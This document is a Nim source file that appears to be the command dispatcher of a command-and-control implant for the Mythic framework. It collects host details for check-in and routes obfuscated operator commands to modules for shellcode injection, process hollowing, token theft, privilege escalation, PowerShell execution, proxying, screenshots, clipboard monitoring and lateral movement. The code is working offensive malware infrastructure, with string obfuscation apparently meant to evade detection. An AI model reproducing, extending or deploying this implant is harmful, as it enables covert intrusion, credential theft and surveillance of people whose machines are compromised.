import std/[json]
import ../config
import ../utils/debug
import ../utils/strenc
import ../utils/sysinfo

# Cross-platform optional task modules
when defined(cmd_exit):
  import ../tasks/exit
when defined(cmd_ls):
  import ../tasks/ls
when defined(cmd_download):
  import ../tasks/download
when defined(cmd_upload):
  import ../tasks/upload
when defined(cmd_run):
  import ../tasks/run
when defined(cmd_whoami):
  import ../tasks/whoami
when defined(cmd_cat):
  import ../tasks/cat
when defined(cmd_mkdir):
  import ../tasks/mkdir
when defined(cmd_cp):
  import ../tasks/cp
when defined(cmd_mv):
  import ../tasks/mv
when defined(cmd_cd):
  import ../tasks/cd
when defined(cmd_ps):
  import ../tasks/ps
when defined(cmd_pwd):
  import ../tasks/pwd
when defined(cmd_rm):
  import ../tasks/rm
when defined(cmd_pty):
  import ../tasks/pty
when defined(cmd_socks):
  import ../tasks/socks
when defined(cmd_rpfwd):
  import ../tasks/rpfwd
when defined(cmd_redirect):
  import ../tasks/redirect
when defined(cmd_getenv):
  import ../tasks/getenv as taskGetenv
when defined(cmd_connect):
  import ../tasks/connect
when defined(cmd_disconnect):
  import ../tasks/disconnect
when defined(cmd_portscan):
  import ../tasks/portscan
when defined(cmd_ifconfig):
  import ../tasks/ifconfig
when defined(cmd_netstat):
  import ../tasks/netstat
when defined(cmd_config):
  import ../tasks/config as taskConfig
when defined(cmd_pkill):
  import ../tasks/pkill

when not defined(windows):
  import ../utils/m_responses

when defined(windows):
  when defined(cmd_execute_assembly):
    import ../tasks/execute_assembly
  when defined(cmd_inline_execute):
    import ../tasks/inline_execute
  when defined(cmd_powerpick):
    import ../tasks/powerpick
  when defined(cmd_powershell):
    import ../tasks/powershell
  when defined(cmd_powershell_import):
    import ../tasks/powershell_import
  when defined(cmd_powershell_list):
    import ../tasks/powershell_list
  when defined(cmd_shinject):
    import ../tasks/shinject
  when defined(cmd_make_token):
    import ../tasks/make_token
  when defined(cmd_steal_token):
    import ../tasks/steal_token
  when defined(cmd_rev2self):
    import ../tasks/rev2self
  when defined(cmd_runas):
    import ../tasks/runas
  when defined(cmd_getsystem):
    import ../tasks/getsystem
  when defined(cmd_getprivs):
    import ../tasks/getprivs
  when defined(cmd_listpipes):
    import ../tasks/listpipes
  when defined(cmd_scshell):
    import ../tasks/scshell
  when defined(cmd_spawnto_x64):
    import ../tasks/spawnto_x64
  when defined(cmd_spawnto_x86):
    import ../tasks/spawnto_x86
  when defined(cmd_ppid):
    import ../tasks/ppid
  when defined(cmd_blockdlls):
    import ../tasks/blockdlls
  when defined(cmd_reg_query):
    import ../tasks/reg_query
  when defined(cmd_reg_write_value):
    import ../tasks/reg_write_value
  when defined(cmd_net_dclist):
    import ../tasks/net_dclist
  when defined(cmd_net_localgroup):
    import ../tasks/net_localgroup
  when defined(cmd_net_localgroup_member):
    import ../tasks/net_localgroup_member
  when defined(cmd_net_shares):
    import ../tasks/net_shares
  when defined(cmd_screenshot):
    import ../tasks/screenshot
  when defined(cmd_get_av):
    import ../tasks/get_av
  when defined(cmd_clipboard):
    import ../tasks/clipboard
  when defined(cmd_clipboard_monitor):
    import ../tasks/clipboard_monitor
  when defined(cmd_donut):
    import ../tasks/donut
  when defined(cmd_inject_hollow):
    import ../tasks/inject_hollow
  when defined(cmd_run_pe):
    import ../tasks/run_pe
  when defined(cmd_sc):
    import ../tasks/sc
  when defined(cmd_spawn):
    import ../tasks/spawn
  when defined(cmd_spawnas):
    import ../tasks/spawnas
  when defined(cmd_link):
    import ../tasks/link
  when defined(cmd_unlink):
    import ../tasks/unlink
  when defined(cmd_register_file):
    import ../tasks/register_file
  when defined(cmd_deregister_file):
    import ../tasks/deregister_file

type
  TaskExecutionResult* = object
    response*: JsonNode
    needsBackgroundTracking*: bool  # True if caller should track as background task
    shouldExit*: bool  # True if this was an exit command

proc buildCheckinInfo*(): JsonNode =
  ## Build checkin information that can be reused for initial checkin or P2P checkin
  let sysInfo = getSystemInfo()
  let cfg = getConfig()
  
  result = %*{
    obf("action"): obf("checkin"),
    obf("uuid"): cfg.uuid,
    obf("ips"): sysInfo.ips,
    obf("os"): sysInfo.os,
    obf("user"): sysInfo.user,
    obf("host"): sysInfo.hostname,
    obf("pid"): sysInfo.pid,
    obf("architecture"): sysInfo.arch,
    obf("domain"): sysInfo.domain,
    obf("integrity_level"): sysInfo.integrityLevel,
    obf("process_name"): sysInfo.processName,
    obf("cwd"): sysInfo.cwd,
    obf("impersonation_context"): nil
  }

proc executeTask*(taskId: string, command: string, params: JsonNode): TaskExecutionResult =
  ## Execute a single task and return the response
  ## This can be called from any profile (HTTP, TCP, etc.) or from agent.nim
  ## Returns a TaskExecutionResult indicating if background tracking is needed
  debug "[DEBUG] === PROCESSING TASK ==="
  debug "[DEBUG] Task ID: " & taskId
  debug "[DEBUG] Command: " & command
  if params.len > 0:
    debug "[DEBUG] Parameters: " & params.pretty()
  else:
    debug "[DEBUG] No parameters"
  
  # Initialize result
  result.needsBackgroundTracking = false
  result.shouldExit = false
  
  # Default error response
  result.response = %*{
    obf("task_id"): taskId,
    obf("user_output"): "Command '" & command & "' not yet implemented",
    obf("completed"): true,
    obf("status"): "error"
  }
  
  try:
    case command
    of obf("exit"):
      when defined(cmd_exit):
        debug "[DEBUG] Executing exit command"
        result.response = executeExit(params)
        result.response[obf("task_id")] = %taskId
        result.shouldExit = true
      
    of obf("sleep"):
      when defined(cmd_sleep):
        debug "[DEBUG] Executing sleep command"
        # Sleep modifies global config, but we need to pass current values
        # For now, just acknowledge - real implementation needs access to agent state
        result.response = %*{
          obf("task_id"): taskId,
          obf("user_output"): obf("Sleep updated"),
          obf("completed"): true,
          obf("status"): obf("success")
        }
      
    of obf("ls"):
      when defined(cmd_ls):
        debug "[DEBUG] Executing ls command"
        let lsResult = executeLs(params)
        if lsResult.hasKey(obf("files")):
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): obf("completed"),
            obf("file_browser"): lsResult,
            obf("user_output"): $lsResult
          }
          debug "[DEBUG] Ls found " & $lsResult["files"].len & " files"
        else:
          result.response = lsResult
          result.response[obf("task_id")] = %taskId
          debug "[DEBUG] Ls returned error: " & result.response["user_output"].getStr()
    
    of obf("download"):
      when defined(cmd_download):
        debug "[DEBUG] Starting download"
        result.response = executeDownload(taskId, params)
        result.needsBackgroundTracking = true
    
    of obf("upload"):
      when defined(cmd_upload):
        debug "[DEBUG] Starting upload"
        result.response = executeUpload(taskId, params)
        result.needsBackgroundTracking = true
    
    of obf("execute_assembly"):
      when defined(cmd_execute_assembly):
        when defined(windows):
          debug "[DEBUG] Starting execute-assembly (file download)"
          result.response = executeAssembly(taskId, params)
          if not (result.response.hasKey(obf("completed")) and result.response[obf("completed")].getBool()):
            result.needsBackgroundTracking = true
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("execute_assembly command is only available on Windows")
          }
    
    of obf("inline_execute"):
      when defined(cmd_inline_execute):
        when defined(windows):
          debug "[DEBUG] Starting inline_execute (BOF download)"
          result.response = inlineExecute(taskId, params)
          if not (result.response.hasKey(obf("completed")) and result.response[obf("completed")].getBool()):
            result.needsBackgroundTracking = true
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("inline_execute command is only available on Windows")
          }
    
    of obf("shinject"):
      when defined(cmd_shinject):
        when defined(windows):
          debug "[DEBUG] Starting shinject (shellcode download)"
          result.response = shinject(taskId, params)
          if not (result.response.hasKey(obf("completed")) and result.response[obf("completed")].getBool()):
            result.needsBackgroundTracking = true
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("shinject command is only available on Windows")
          }
    
    of obf("donut"):
      when defined(cmd_donut):
        when defined(windows):
          debug "[DEBUG] Starting donut (file download)"
          result.response = donut(taskId, params)
          if not (result.response.hasKey(obf("completed")) and result.response[obf("completed")].getBool()):
            result.needsBackgroundTracking = true
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("donut command is only available on Windows")
          }
    
    of obf("inject_hollow"):
      when defined(cmd_inject_hollow):
        when defined(windows):
          debug "[DEBUG] Starting inject_hollow (file download)"
          result.response = injectHollow(taskId, params)
          if not (result.response.hasKey(obf("completed")) and result.response[obf("completed")].getBool()):
            result.needsBackgroundTracking = true
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("inject_hollow command is only available on Windows")
          }
    
    of obf("run"), obf("shell"):
      when defined(cmd_run):
        debug "[DEBUG] Executing run/shell command"
        result.response = run(taskId, params)
        result.response[obf("task_id")] = %taskId
    
    of obf("powerpick"):
      when defined(cmd_powerpick):
        when defined(windows):
          debug "[DEBUG] Executing powerpick command"
          result.response = powerpick(taskId, params)
          result.response[obf("task_id")] = %taskId
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("powerpick command is only available on Windows")
          }
    
    of obf("powershell"):
      when defined(cmd_powershell):
        when defined(windows):
          debug "[DEBUG] Executing powershell command"
          result.response = powershell(taskId, params)
          result.response[obf("task_id")] = %taskId
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("powershell command is only available on Windows")
          }
    
    of obf("powershell_import"):
      when defined(cmd_powershell_import):
        when defined(windows):
          debug "[DEBUG] Starting powershell_import (file download)"
          result.response = executePowershellImport(taskId, params)
          result.needsBackgroundTracking = true
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("powershell_import command is only available on Windows")
          }
    
    of obf("powershell_list"):
      when defined(cmd_powershell_list):
        when defined(windows):
          debug "[DEBUG] Executing powershell_list command"
          result.response = powershellList(taskId, params)
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("powershell_list command is only available on Windows")
          }
    
    of obf("whoami"):
      when defined(cmd_whoami):
        debug "[DEBUG] Executing whoami command"
        result.response = whoami(taskId, $params)
    
    of obf("cat"):
      when defined(cmd_cat):
        debug "[DEBUG] Executing cat command"
        result.response = catFile(taskId, $params)
    
    of obf("mkdir"):
      when defined(cmd_mkdir):
        debug "[DEBUG] Executing mkdir command"
        result.response = makeDirectory(taskId, $params)
    
    of obf("cp"):
      when defined(cmd_cp):
        debug "[DEBUG] Executing cp command"
        result.response = cpFile(taskId, $params)
    
    of obf("mv"):
      when defined(cmd_mv):
        debug "[DEBUG] Executing mv command"
        result.response = mvFile(taskId, $params)
    
    of obf("cd"):
      when defined(cmd_cd):
        debug "[DEBUG] Executing cd command"
        result.response = changeDirectory(taskId, $params)
    
    of obf("ps"):
      when defined(cmd_ps):
        debug "[DEBUG] Executing ps command"
        result.response = ps($params)
        result.response[obf("task_id")] = %taskId
    
    of obf("pwd"):
      when defined(cmd_pwd):
        debug "[DEBUG] Executing pwd command"
        result.response = pwd(taskId, params)
    
    of obf("rm"):
      when defined(cmd_rm):
        debug "[DEBUG] Executing rm command"
        result.response = rm(taskId, params)
    
    of obf("pty"):
      when defined(cmd_pty):
        debug "[DEBUG] Executing pty command"
        result.response = pty(taskId, params)
    
    of obf("socks"):
      when defined(cmd_socks):
        debug "[DEBUG] Executing socks command"
        result.response = socks(taskId, params)
    
    of obf("rpfwd"):
      when defined(cmd_rpfwd):
        debug "[DEBUG] Executing rpfwd command"
        result.response = rpfwd(taskId, params)
    
    of obf("connect"):
      when defined(cmd_connect):
        debug "[DEBUG] Executing connect command"
        result.response = handleConnect(taskId, params)
      
    of obf("link"):
      when defined(cmd_link):
        when defined(windows):
          debug "[DEBUG] Executing link command"
          result.response = handleLink(taskId, params)
        else:
          result.response = mythicError(taskId, "Link command is only supported on Windows")

    of obf("disconnect"):
      when defined(cmd_disconnect):
        debug "[DEBUG] Executing disconnect command"
        result.response = handleDisconnect(taskId, params)

    of obf("unlink"):
      when defined(cmd_unlink):
        when defined(windows):
          debug "[DEBUG] Executing unlink command"
          result.response = handleUnlink(taskId, params)
        else:
          result.response = mythicError(taskId, "Unlink command is only supported on Windows")
    
    of obf("redirect"):
      when defined(cmd_redirect):
        debug "[DEBUG] Executing redirect command"
        result.response = redirect(taskId, params)
    
    of obf("getenv"):
      when defined(cmd_getenv):
        debug "[DEBUG] Executing getenv command"
        result.response = taskGetenv.getenv(taskId, params)
    
    of obf("ifconfig"):
      when defined(cmd_ifconfig):
        debug "[DEBUG] Executing ifconfig command"
        result.response = ifconfig(taskId, params)
    
    of obf("netstat"):
      when defined(cmd_netstat):
        debug "[DEBUG] Executing netstat command"
        result.response = netstat(taskId, params)
    
    of obf("config"):
      when defined(cmd_config):
        debug "[DEBUG] Executing config command"
        result.response = taskConfig.config(taskId, params)
    
    of obf("pkill"):
      when defined(cmd_pkill):
        debug "[DEBUG] Executing pkill command"
        result.response = pkill(taskId, params)
    
    of obf("portscan"):
      when defined(cmd_portscan):
        debug "[DEBUG] Starting portscan (background task)"
        result.response = portscan(taskId, params)
    
    # Windows-specific commands
    of obf("make_token"):
      when defined(cmd_make_token):
        when defined(windows):
          debug "[DEBUG] Executing make_token command"
          result.response = makeToken(taskId, params)
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("make_token command is only available on Windows")
          }
    
    of obf("steal_token"):
      when defined(cmd_steal_token):
        when defined(windows):
          debug "[DEBUG] Executing steal_token command"
          result.response = stealToken(taskId, params)
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("steal_token command is only available on Windows")
          }
    
    of obf("rev2self"):
      when defined(cmd_rev2self):
        when defined(windows):
          debug "[DEBUG] Executing rev2self command"
          result.response = rev2self(taskId, params)
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("rev2self command is only available on Windows")
          }
    
    of obf("runas"):
      when defined(cmd_runas):
        when defined(windows):
          debug "[DEBUG] Executing runas command"
          result.response = runas(taskId, params)
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("runas command is only available on Windows")
          }
    
    of obf("getsystem"):
      when defined(cmd_getsystem):
        when defined(windows):
          debug "[DEBUG] Executing getsystem command"
          result.response = getsystem(taskId, params)
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("getsystem command is only available on Windows")
          }
    
    of obf("getprivs"):
      when defined(cmd_getprivs):
        when defined(windows):
          debug "[DEBUG] Executing getprivs command"
          result.response = getprivs(taskId, params)
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("getprivs command is only available on Windows")
          }
    
    of obf("listpipes"):
      when defined(cmd_listpipes):
        when defined(windows):
          debug "[DEBUG] Executing listpipes command"
          result.response = listpipes(taskId, params)
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("listpipes command is only available on Windows")
          }
    
    of obf("scshell"):
      when defined(cmd_scshell):
        when defined(windows):
          debug "[DEBUG] Executing scshell command"
          result.response = scshell(taskId, params)
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("scshell command is only available on Windows")
          }
    
    of obf("spawnto_x64"):
      when defined(cmd_spawnto_x64):
        when defined(windows):
          debug "[DEBUG] Executing spawnto_x64 command"
          result.response = spawnto_x64(taskId, params)
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("spawnto_x64 command is only available on Windows")
          }
    
    of obf("spawnto_x86"):
      when defined(cmd_spawnto_x86):
        when defined(windows):
          debug "[DEBUG] Executing spawnto_x86 command"
          result.response = spawnto_x86(taskId, params)
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("spawnto_x86 command is only available on Windows")
          }
    
    of obf("ppid"):
      when defined(cmd_ppid):
        when defined(windows):
          debug "[DEBUG] Executing ppid command"
          result.response = ppid(taskId, params)
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("ppid command is only available on Windows")
          }
    
    of obf("blockdlls"):
      when defined(cmd_blockdlls):
        when defined(windows):
          debug "[DEBUG] Executing blockdlls command"
          result.response = blockdlls(taskId, params)
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("blockdlls command is only available on Windows")
          }
    
    of obf("reg_query"):
      when defined(cmd_reg_query):
        when defined(windows):
          debug "[DEBUG] Executing reg_query command"
          result.response = regQuery(taskId, params)
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("reg_query command is only available on Windows")
          }
    
    of obf("reg_write_value"):
      when defined(cmd_reg_write_value):
        when defined(windows):
          debug "[DEBUG] Executing reg_write_value command"
          result.response = regWriteValue(taskId, params)
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("reg_write_value command is only available on Windows")
          }
    
    of obf("net_dclist"):
      when defined(cmd_net_dclist):
        when defined(windows):
          debug "[DEBUG] Executing net_dclist command"
          result.response = netDclist(taskId, params)
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("net_dclist command is only available on Windows")
          }
    
    of obf("net_localgroup"):
      when defined(cmd_net_localgroup):
        when defined(windows):
          debug "[DEBUG] Executing net_localgroup command"
          result.response = netLocalgroup(taskId, params)
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("net_localgroup command is only available on Windows")
          }
    
    of obf("net_localgroup_member"):
      when defined(cmd_net_localgroup_member):
        when defined(windows):
          debug "[DEBUG] Executing net_localgroup_member command"
          result.response = netLocalgroupMember(taskId, params)
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("net_localgroup_member command is only available on Windows")
          }
    
    of obf("net_shares"):
      when defined(cmd_net_shares):
        when defined(windows):
          debug "[DEBUG] Executing net_shares command"
          result.response = netShares(taskId, params)
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("net_shares command is only available on Windows")
          }
    
    of obf("screenshot"):
      when defined(cmd_screenshot):
        when defined(windows):
          debug "[DEBUG] Executing screenshot command"
          result.response = screenshot(taskId, params)
          result.needsBackgroundTracking = true
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("screenshot command is only available on Windows")
          }
    
    of obf("get_av"):
      when defined(cmd_get_av):
        when defined(windows):
          debug "[DEBUG] Executing get_av command"
          result.response = getAv(taskId, params)
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("get_av command is only available on Windows")
          }
    
    of obf("clipboard"):
      when defined(cmd_clipboard):
        when defined(windows):
          debug "[DEBUG] Executing clipboard command"
          result.response = clipboard(taskId, params)
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("clipboard command is only available on Windows")
          }
    
    of obf("clipboard_monitor"):
      when defined(cmd_clipboard_monitor):
        when defined(windows):
          debug "[DEBUG] Starting clipboard_monitor (monitoring task)"
          result.response = clipboardMonitor(taskId, params)
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("clipboard_monitor command is only available on Windows")
          }
    
    of obf("run_pe"):
      when defined(cmd_run_pe):
        when defined(windows):
          debug "[DEBUG] Starting run_pe (file download)"
          result.response = run_pe(taskId, params)
          if not (result.response.hasKey(obf("completed")) and result.response[obf("completed")].getBool()):
            result.needsBackgroundTracking = true
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("run_pe command is only available on Windows")
          }
    
    of obf("register_file"):
      when defined(cmd_register_file):
        when defined(windows):
          debug "[DEBUG] Starting register_file (file download for caching)"
          result.response = registerFile(taskId, params)
          if not (result.response.hasKey(obf("completed")) and result.response[obf("completed")].getBool()):
            result.needsBackgroundTracking = true
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("register_file command is only available on Windows")
          }
    
    of obf("deregister_file"):
      when defined(cmd_deregister_file):
        when defined(windows):
          debug "[DEBUG] Executing deregister_file command"
          result.response = deregisterFile(taskId, params)
          result.response[obf("task_id")] = %taskId
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("deregister_file command is only available on Windows")
          }
    
    of obf("sc"):
      when defined(cmd_sc):
        when defined(windows):
          debug "[DEBUG] Executing sc command"
          result.response = sc(taskId, params)
          result.response[obf("task_id")] = %taskId
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("sc command is only available on Windows")
          }
    
    of obf("spawn"):
      when defined(cmd_spawn):
        when defined(windows):
          debug "[DEBUG] Starting spawn (payload download)"
          result.response = spawn(taskId, params)
          result.needsBackgroundTracking = true
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("spawn command is only available on Windows")
          }
    
    of obf("spawnas"):
      when defined(cmd_spawnas):
        when defined(windows):
          debug "[DEBUG] Starting spawnas (payload download)"
          result.response = spawnas(taskId, params)
          result.needsBackgroundTracking = true
        else:
          result.response = %*{
            obf("task_id"): taskId,
            obf("completed"): true,
            obf("status"): "error",
            obf("user_output"): obf("spawnas command is only available on Windows")
          }
    
    else:
      # Command not implemented
      debug "[DEBUG] Command not implemented: " & command
  
  except Exception as e:
    debug "[DEBUG] Task execution error: " & e.msg
    result.response = %*{
      obf("task_id"): taskId,
      obf("user_output"): "Error executing command: " & e.msg,
      obf("completed"): true,
      obf("status"): "error"
    }
    result.needsBackgroundTracking = false
  
  if result.response.hasKey(obf("status")):
    debug "[DEBUG] Task result status: ", result.response["status"].getStr()
  if result.response.hasKey(obf("user_output")):
    let output = result.response[obf("user_output")].getStr()
    if output.len < 200:
      debug "[DEBUG] Task output: ", output
    else:
      debug "[DEBUG] Task output length: ", output.len, " bytes"
